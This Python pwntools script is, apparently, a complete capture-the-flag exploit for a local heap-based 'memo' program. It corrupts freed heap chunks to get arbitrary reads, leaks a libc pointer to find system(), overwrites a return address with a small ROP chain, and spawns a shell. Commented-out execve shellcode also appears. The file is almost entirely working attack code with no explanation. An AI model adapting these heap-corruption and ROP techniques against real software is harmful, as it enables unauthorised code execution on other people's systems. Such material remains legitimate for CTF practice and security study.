#!/usr/bin/env python
import pwn,sys
import re

p = pwn.process(['./memo'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

sysoffset = -0x17BBA0

def begin(name, pw, q = "A", sen = 0):
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("(y/n)")
    p.sendline(pw)
    if pw == "y":
        p.recvuntil("Password:")
        if sen == 0:
            p.sendline(q)
        else:
            p.send(q)
        return
    else:
        return

def leave_msg(index, length, msg, rec = 1, sen = 0):
    if rec == 1:
        p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Length:")
    p.sendline(str(length))
    if length <= 0x20:
        p.recvuntil("Message:")
        if sen ==0:
            p.sendline(msg)
        else:
            p.send(msg)
    else:
        p.recvuntil("though")
        p.send(msg)
    return

def edit_msg(msg, rec = 1, ret = 1,sen = 0):
    if rec == 1:
        p.recvuntil(">>")
    p.sendline("2")
    p.recvuntil("message:")
    if sen ==0:
        p.sendline(msg)
    else:
        p.send(msg)
    if ret == 1:
        r = p.recvuntil(">>")
        return r
    else:
        return None

def view_msg(index, rec = 1):
    if rec == 1:
        p.recvuntil(">>")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))
    r = p.recvuntil(">>")
    return r


def delete_msg(index, rec = 1):
    if rec == 1:
        p.recvuntil(">>")
    p.sendline("4")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Deleted!")
    return

def change_pwd(pwd, nuser, npwd, rec = 1,ret = 1):
    if rec == 1:
        p.recvuntil(">>")
    p.sendline("5")
    p.recvuntil("Password:")
    p.sendline(pwd)
    p.recvuntil("name:")
    p.send(nuser)
    p.recvuntil("password:")
    p.send(npwd)
    if ret == 1:
        p.send("\x40")
        r = p.recvuntil(">>")
        return r
    return None

def quit(rec = 1):
    if rec == 1:
        p.recvuntil(">>")
    p.sendline("6")
    p.recvuntil("bye")
    return


begin("SS","y","A")
leave_msg(3,32,"/bin/sh",1,1)
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#leave_msg(3,32,shellcode,1,1)
leave_msg(1,32,"B"*10)
leave_msg(2,32,"C"*10)
leave_msg(0,32,"A"*10)
delete_msg(2)
delete_msg(1)
msg = "A"*32+pwn.p64(0)+pwn.p64(0x31)+pwn.p64(0x602a78)
leave_msg(1, 56, msg,1,1)
leave_msg(2,32,"OK")
newmsg = pwn.p64(0x6029e0)
leave_msg(4,32, newmsg,1,1)
edit_msg(newmsg)
r = view_msg(1,0)
#print r
r = re.search("Message:.*", r).group(0)[9:].ljust(8,"\x00")
la = pwn.util.packing.unpack(r, 'all', endian = 'little', sign = False)
print "[+] Value of *stdout: "+hex(la)
sys = la + sysoffset
print "[+] System at: "+hex(sys)
newmsg = pwn.p64(0x602ab8) 
edit_msg(newmsg,0)
r = view_msg(1,0)
#print r
r = re.search("Message:.*", r).group(0)[9:].ljust(8,"\x00")
la2 = pwn.util.packing.unpack(r, 'all', endian = 'little', sign = False)
heapret = la2 + 0x58
print "[+] Heap ret addr: "+hex(heapret)
newmsg = pwn.p64(0x602a88)
edit_msg(newmsg,0)
r = view_msg(1,0)
#print r
r = re.search("Message:.*", r).group(0)[9:].ljust(8,"\x00")
binshaddr = pwn.util.packing.unpack(r, 'all', endian = 'little', sign = False)
print "[+] Addr of /bin/sh: "+hex(binshaddr)

newmsg = "A"*24+pwn.p64(heapret)
edit_msg(newmsg,0,1,1)
#newmsg = pwn.p64(sys) + pwn.p64(binshaddr)
newmsg = pwn.p64(0x401263)
newmsg += pwn.p64(binshaddr)
newmsg += pwn.p64(sys)

edit_msg(newmsg,0,1,1)
quit(0)
print "[+] Shell spawned."


#leave_msg(2,50,"CD")
#a = edit_msg("1")
#print a
#delete_msg(1,0)
#r = change_pwd("B","A"*0x20,"C"*0x20)
#print r
#msg = "A"*32+pwn.p64(0)+pwn.p64(0xcf1)
#edit_msg(msg,0,0,1)


p.interactive()
